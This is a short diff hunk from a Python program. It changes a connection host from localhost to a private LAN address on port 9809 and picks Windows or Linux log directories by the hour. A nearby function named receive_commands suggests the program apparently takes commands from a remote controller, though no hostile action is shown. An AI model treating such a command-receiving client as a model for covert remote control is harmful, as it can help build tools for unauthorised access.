@@ -189,7 +189,7 @@ def receive_commands(sock):
 
 def main():
     global stop
-    host = 'localhost'
+    host = '192.168.18.144'
     port = 9809
     current_hour = datetime.datetime.now().strftime("%Hh")
     log_dir = LOG_DIR_WINDOWS if get_os() == 'Windows' else LOG_DIR_LINUX
